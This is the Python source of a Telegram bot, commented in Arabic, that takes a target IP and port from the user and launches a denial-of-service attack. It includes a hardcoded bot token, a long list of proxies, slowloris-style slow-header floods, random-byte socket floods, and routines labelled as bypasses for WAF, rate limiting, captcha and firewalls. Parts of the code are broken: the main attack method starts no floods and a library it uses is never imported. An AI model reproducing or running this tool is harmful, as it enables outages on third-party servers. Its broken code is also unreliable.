import telebot
import logging
import random
import socket
import time
import threading

# إعدادات السجل
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# إعدادات البوت
TOKEN = "7298771620:AAH7m6szPDLX49Y0HuM250nCPN7kDhHlV6A"  # ضع هنا توكن البوت
bot = telebot.TeleBot(TOKEN)

# بروكسيات قائمة (مثال)
PROXIES = [    "156.228.94.94:3128",
    "34.81.160.132:80",
    "154.239.3.184:8081",
    "103.57.134.250:45958",
    "50.221.74.130:80",
    "110.77.236.187:4145",
    "185.189.199.77:8080",
    "108.142.108.255:8070",
    "89.110.116.45:8118",
    "4.175.200.138:8080",
    "3.139.242.184:80",
    "197.254.7.86:4145",
    "80.249.112.162:80",
    "45.43.64.247:6505",
    "47.243.92.199:3128",
    "171.240.89.128:20002",
    "164.92.237.188:62586",
    "107.181.154.252:5930",
    "20.24.43.214:80",
    "75.119.207.148:32238",
    "177.184.67.109:4145",
    "51.89.255.67:80",
    "8.219.150.127:443",
    "27.254.104.134:8080",
    "93.171.225.191:80",
    "95.188.79.3:1080",
    "50.174.7.156:80",
    "103.141.70.18:8080",
    "121.132.108.65:5156",
    "146.103.56.47:5595",
    "178.45.163.186:7788",
    "109.238.219.241:4153",
    "47.239.217.242:80",
    "38.127.179.19:55994",
    "154.16.146.41:80",
    "185.231.205.133:8020",
    "199.195.253.126:30046",
    "204.236.176.61:3128",
    "49.49.37.113:8080",
    "202.58.199.204:5678",
    "104.207.61.44:3128",
    "116.99.238.131:54226",
    "198.49.68.80:80",
    "102.0.9.114:8080",
    "191.103.219.225:48612",
    "38.255.85.157:999",
    "5.128.15.152:3128",
    "103.148.211.96:1080",
    "8.221.141.88:3129",
    "154.214.1.145:3128",
    "27.189.134.141:8089",
    "97.74.87.226:80",
    "45.43.70.233:6520",
    "1.202.174.38:49080",
    "45.228.151.157:1088",
    "161.97.136.251:3128",
    "177.131.29.211:4153",
    "166.0.235.107:40184",
    "45.230.48.131:999",
    "200.95.184.58:999",
    "190.58.248.86:80",
    "185.226.207.211:5760",
    "41.139.233.13:8080",
    "109.207.61.197:8090",
    "103.109.2.94:4153",
    "197.232.65.40:55443",
    "122.129.107.54:5678",
    "8.215.15.163:1080",
    "115.74.10.26:10003",
    "37.187.109.70:10111",
    "38.45.242.120:999",
    "181.57.225.166:3629",
    "144.126.217.189:12345",
    "125.24.183.230:8080",
    "195.210.172.46:58350",
    "177.85.65.177:4153",
    "94.158.155.138:54698",
    "54.93.225.46:8090",
    "24.106.221.230:10838",
    "104.207.34.205:3128",
    "63.143.57.115:80",
    "113.161.175.177:5678",
    "5.58.33.187:5678",
    "189.89.209.132:80",
    "189.173.185.66:999",
    "90.156.142.65:46257",
    "31.43.179.214:80",
    "185.198.2.113:11223",
    "38.10.69.99:9090",
    "1.2.216.101:4145",
    "117.102.77.201:4145",
    "45.239.30.1:999",
    "188.132.222.8:8080",
    "143.42.66.91:80",
    "103.165.156.148:8090",
    "196.2.13.12:4153",
    "109.233.211.82:1080",
    "27.254.46.194:80",
    "13.37.59.99:80",
    "104.143.226.106:5709",
    "186.96.71.108:999",
    "188.166.231.167:7497",
    "43.243.117.57:80",
    "94.247.129.244:3128",
    "103.199.97.17:39825",
    "8.211.49.86:10000",
    "45.8.21.156:80",
    "91.241.21.237:9812",
    "176.241.143.197:8080",
    "203.160.61.103:4145",
    "178.251.111.20:8080",
    "156.253.174.150:3128",
    "114.232.109.27:2829",
    "8.220.204.215:8443",
    "47.83.192.255:8888",
    "47.238.60.156:8008",
    "92.60.190.79:3128",
    "95.167.29.50:8080",
    "35.76.62.196:80",
    "45.43.81.246:5893",
    "41.128.90.51:1976",
    "185.226.204.242:5795",
    "155.254.38.121:5797",
    "123.30.154.171:7777",
    "47.121.133.212:80",
    "133.232.90.155:80",
    "188.165.36.156:25051",
    "104.25.42.178:80",
    "176.123.56.58:3629",
    "69.49.246.33:59449",
    "3.127.62.252:80",
    "104.207.34.141:3128",
    "122.102.43.185:5678",
    "171.248.211.22:1080",
    "102.0.13.20:8080",
    "103.164.190.221:5430",
    "178.215.190.240:56664",
    "94.73.251.19:1080",
    "142.93.201.183:31952",
    "193.105.62.11:58973",
    "85.214.195.118:80",
    "104.143.224.32:5893",
    "181.57.131.122:8080",
    "103.95.97.50:4153",
    "103.171.83.55:1111",
    "43.200.77.128:3128",
    "31.59.20.63:6641",
    "210.79.146.107:8085",
    "190.181.23.10:4153",
    "41.207.251.154:60606",
    "102.244.120.10:45413",
    "191.101.80.162:80",
    "23.82.137.156:80",
    "72.37.216.68:4145",
    "195.35.2.231:80",
    "176.88.166.215:1080",
    "202.74.244.139:5020",
    "118.163.13.200:8080",
    "160.248.7.177:80",
    "103.172.119.18:4153",
    "165.22.40.99:3128",
    "103.195.118.32:1080",
    "196.24.225.141:8080",
    "103.12.98.19:1080",
    "179.61.196.40:8080",
    "206.189.14.107:1080",
    "179.178.233.45:8000",
    "109.226.175.14:1080",
    "106.118.254.212:4145",
    "107.172.48.154:8080",
    "103.133.60.82:1080",
    "191.103.254.160:8080",
    "36.63.104.173:4153",
    "154.167.199.10:80",
    "208.72.143.25:3128",
    "103.47.204.5:8080",
    "208.43.94.24:443",
    "179.189.233.77:80",
    "196.22.168.163:8080",
    "103.16.56.42:8080",
    "103.131.226.121:1080",
    "190.60.49.115:443",
    "43.253.11.103:8080",
    "178.128.122.72:3128",
    "104.223.98.122:8080",
    "49.229.197.60:8080",
    "103.134.180.179:3128",
    "41.71.191.177:55443",
    "190.206.138.17:8080",
    "45.148.18.191:3128",
    "103.134.40.56:8080",
    "165.22.115.171:3128",
    "95.111.192.40:8080",
    "185.191.219.56:8080",
    "47.118.75.181:3128",
    "197.231.97.210:8080",
    "154.222.32.110:3128",
    "109.163.238.212:8080",
    "200.186.13.126:3128",
    "93.84.186.63:3128",
    "103.131.185.59:8080",
    "176.41.157.238:80",
    "190.102.12.93:8080",
    "185.143.40.88:3128",
    "139.59.42.15:8080",
    "200.57.163.45:8080",
    "103.44.168.67:8080",
    "185.121.182.104:8080",
    "103.151.12.50:4153",
    "123.123.28.182:8080",
    "176.9.51.147:3128",
    "181.22.10.57:80",
    "185.78.174.214:1080",
    "103.22.56.108:8080",
    "179.61.159.103:80",
    "41.77.51.14:8080",
    "217.182.159.222:3128",
    "181.143.228.222:8080",
    "103.251.148.103:3128",
    "46.244.34.27:8080",
    "103.22.132.105:8080",
    "101.53.100.20:3128",
    "109.61.103.102:8080",
    "179.184.78.218:8080",
    "5.255.34.118:3128",
    "109.233.141.125:8080",
    "45.225.59.24:3128",
    "186.240.232.116:80",
    "103.92.169.19:1080",
    "196.182.101.103:8080",
    "103.123.139.225:8080",
    "104.209.112.56:3128",
    "156.96.40.98:8080",
    "185.239.234.42:8080",
    "200.174.146.185:3128",
    "104.238.180.215:80",
    "182.52.226.187:8080",
    "43.241.114.211:8080",
    "104.152.210.57:8080",
    "175.208.100.99:3128",
    "103.133.58.42:1080",
    "188.165.55.36:8080",
    "200.102.139.48:8080",
    "182.253.137.112:8080",
    "213.169.33.7:4000",
    "27.72.224.152:10003",
    "119.235.50.246:4153",
    "36.67.14.151:5678",
    "197.248.231.91:8080",
    "1.179.148.9:36476",
    "200.10.30.77:8083",
    "45.238.57.1:3629",
    "104.207.36.125:3128",
    "36.91.117.59:5678",
    "117.54.130.66:1089",
    "201.149.100.32:8085",
    "61.118.38.234:60808",
    "14.143.75.250:80",
    "31.58.18.37:6306",
    "116.118.98.21:5678",
    "103.126.173.47:8080",
    "190.211.163.20:999",
    "213.143.113.82:80",
    "157.185.165.110:26589",
    "192.163.200.82:35396",
    "103.60.187.129:52195",
    "184.178.172.25:15291",
    "65.1.40.47:1080",
    "103.78.210.178:30000",
    "18.133.16.21:1080",
    "45.6.200.17:8080",
    "176.236.163.37:59311",
    "188.114.96.46:80",
    "213.169.33.7:4002",
    "157.100.63.129:80",
    "91.201.240.84:5678",
    "13.38.153.36:80",
    "116.125.141.115:80",
    "47.90.200.204:19527",
    "50.169.37.50:80",
    "163.172.190.59:16379",
    "3.9.71.167:80",
    "156.228.104.167:3128",
    "201.234.24.89:4153",
    "195.69.135.19:5678",
    "200.123.109.166:4153",
    "45.144.127.18:8080",
    "172.236.22.95:31111",
    "14.63.49.131:4145",
    "8.220.205.172:4002",
    "132.148.165.102:49506",
    "181.114.7.114:999",
    "117.74.125.100:1133",
    "44.226.167.102:3128",
    "8.213.137.155:8090",
    "41.128.91.189:1981",
    "185.159.153.234:80",
    "101.237.38.98:13128",
    "93.157.248.108:88",
    "111.68.127.170:4153",
    "41.203.213.211:8105",
    "27.79.177.174:16000",
    "185.241.238.77:8080",
    "81.12.40.25:8080",
    "104.143.226.159:5762",
    "14.115.105.63:3629",
    "186.190.225.152:999",
    "185.19.4.22:3128",
    "45.116.114.37:5678",
    "45.116.230.79:8080",
    "156.228.109.114:3128",
    "74.208.65.165:14548",
    "23.247.136.254:80",
    "115.77.249.237:10003",
    "141.94.106.171:22817",
    "159.223.180.40:8080",
    "50.116.29.136:32728",
    "50.207.199.83:80",
    "38.54.101.254:9080",
    "91.215.61.181:5678",
    "82.129.135.152:1976",
    "195.178.56.32:8080",
    "114.233.8.193:38801",
    "36.64.27.123:5678",
    "45.70.236.193:999",
    "82.64.186.155:8080",
    "59.124.9.67:3128",
    "80.82.55.71:80",
    "50.207.199.87:80",
    "171.217.69.113:10800",
    "103.66.233.185:4145",
    "172.191.74.198:8080",
    "103.110.10.132:8080",
    "41.128.90.51:1981",
    "156.228.110.208:3128",
    "185.35.130.147:52252",
    "119.10.177.107:1080",
    "149.129.255.179:8080",
    "103.36.11.246:8181",
    "103.79.96.166:4153",
    "102.211.145.213:8105",
    "46.4.13.176:52189",
    "104.207.38.254:3128",
    "50.122.86.118:80",
    "47.100.254.82:80",
    "146.190.84.209:49512",
    "51.89.25.53:3128",
    "201.20.94.93:8080",
    "37.152.163.87:3128",
    "43.153.175.43:443",
    "207.230.8.69:999",
    "91.108.130.111:32650",
    "131.100.51.41:999",
    "31.59.33.38:6614",
    "103.84.178.193:4153",
    "37.1.217.13:30082",
    "166.62.122.168:54193",
    "36.88.148.140:8080",
    "35.154.78.253:1080",
    "180.149.232.165:8080",
    "103.239.255.36:58080",
    "179.57.170.143:999",
    "13.37.89.201:3128",
    "184.169.154.119:80",
    "50.175.212.74:80",
    "104.207.54.43:3128",
    "124.29.249.56:5678",
    "93.171.224.55:4153",
    "182.160.124.214:6969",
    "180.112.180.152:8089",
    "104.207.48.197:3128",
    "91.197.77.118:443",
    "185.105.102.179:80",
    "185.226.204.47:5600",
    "125.229.149.168:65110",
    "146.59.202.7:80",
    "3.90.100.12:80",
    "78.141.193.27:8888",
    "91.150.67.17:8080",
    "121.101.185.69:43296",
    "49.128.176.50:10800",
    "43.224.116.125:8080",
    "41.222.8.254:8082",
    "27.254.46.192:80",
    "185.225.226.181:1080",
    "104.255.170.66:50109",
    "78.38.100.121:8080",
    "91.217.179.174:8080",
    "3.122.84.99:80",
    "104.207.43.86:3128",
    "92.113.128.4:6530",
    "104.143.224.209:6070",
    "8.211.194.85:9080",
    "8.220.204.215:4145",
    "144.91.71.101:24808",
    "141.193.213.236:80",
    "103.190.112.210:8080",
    "190.211.172.178:999",
    "221.231.13.198:1080",
    "154.236.168.176:1981",
    "51.159.66.158:3128",
    "187.95.82.38:3629",]

# إرسال رسالة بالبداية
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "مرحباً! \n🔐 من فضلك أدخل الـ IP والمنفذ بصيغة:\n`127.0.0.1:10018`")

# طلب IP والمنفذ وعدد الهجمات
@bot.message_handler(func=lambda message: ':' in message.text)
def handle_ip(message):
    user_input = message.text
    if ':' in user_input:
        ip, port = user_input.split(':')
        bot.reply_to(message, f"تم استلام الـ IP والمنفذ: {ip}:{port}\n💥 الآن، من فضلك أرسل عدد الهجمات.")
        bot.register_next_step_handler(message, handle_attack_count, ip, port)

# عدد الهجمات
def handle_attack_count(message, ip, port):
    try:
        attack_count = int(message.text)
        bot.reply_to(message, f"🛠️ الهجمات بدأت على {ip}:{port} باستخدام {attack_count} هجوم.")
        start_attack(ip, int(port), attack_count)
    except ValueError:
        bot.reply_to(message, "📛 العدد غير صحيح. من فضلك أدخل عدد صحيح للهجمات.")

# بدء الهجوم
def start_attack(target, port, attack_count):
    attack = FMSW(target, port, attack_count)
    attack.ddos()

# تعريف فئة FMSW (مثل الكود الذي قدمته)
class FMSW:
    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_running = False
        self.attack_duration = 300
        self.attack_interval = 10
        self.max_connections = 1000
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
        ]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        ]
        self.random_user_agent = random.choice(self.user_agents)

    def ddos(self):
        print("بدأ الهجوم!")
        self.is_running = True
        # يمكن إضافة عمليات الهجوم هنا مثل:
        # self.slow_referer(), self.slow_user_agent(), الخ.

    # استكمال العمليات المختلفة للهجوم
    def bypass_protection(self):
        while self.is_running:
            try:
                headers = {
                    "X-XSS-Protection": "0",
                    "Content-Security-Policy": "default-src 'self'",
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "SAMEORIGIN",
                    "Referrer-Policy": "no-referrer-when-downgrade",
                    "Feature-Policy": "camera 'none'; microphone 'none'",
                    "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
                    "Access-Control-Allow-Origin": "*"
                }
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Bypass Protection: Successful")
            except Exception as e:
                print(f"Bypass Protection: Failed - {e}")

    def bypass_ids_ips(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, verify=False, proxies={"http": "http://127.0.0.1:8080"})
                print("Bypass IDS/IPS: Successful")
            except Exception as e:
                print(f"Bypass IDS/IPS: Failed - {e}")
            time.sleep(0.5)
        
    def bypass_firewalls(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(random._urandom(1024), (self.target, self.port))
                s.close()
                print("Bypass Firewalls: Successful")
            except Exception as e:
                print(f"Bypass Firewalls: Failed - {e}")
            time.sleep(0.1)

    def bypass_rate_limiting(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"X-Forwarded-For": "127.0.0.1"}
                requests.get(url, headers=headers)
                print("Bypass Rate Limiting: Successful")
            except Exception as e:
                print(f"Bypass Rate Limiting: Failed - {e}")
            time.sleep(0.5)

    def bypass_captcha(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, cookies={"captcha": "false"})
                print("Bypass Captcha: Successful")
            except Exception as e:
                print(f"Bypass Captcha: Failed - {e}")
            time.sleep(0.5)

    def bypass_ip_blocking(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, timeout=1)
                print("Bypass IP Blocking: Successful")
            except Exception as e:
                print(f"Bypass IP Blocking: Failed - {e}")
            time.sleep(0.5)

    def bypass_waf(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, allow_redirects=False)
                print("Bypass WAF: Successful")
            except Exception as e:
                print(f"Bypass WAF: Failed - {e}")
            time.sleep(0.5)

    def slow_referer3(self):
        while self.is_running:
            try:
                headers = {"Referer": "http://www.test.com"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Referer3: Successful")
            except Exception as e:
                print(f"Slow Referer3: Failed - {e}")

    def slow_user_agent(self):
        while self.is_running:
            try:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
                conn = socket
                (self.target, self.port)
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow User Agent: Successful")
            except Exception as e:
                print(f"Slow User Agent: Failed - {e}")

    def start_attack_thread(self):
        attack_thread = threading.Thread(target=self.ddos)
        attack_thread.start()
        print(f"بدأ الهجوم على {self.target}:{self.port} باستخدام {self.threads} خيوط.")

# تكوين البوت وتشغيله
def main():
    bot.polling(none_stop=True)

if __name__ == '__main__':
    main()
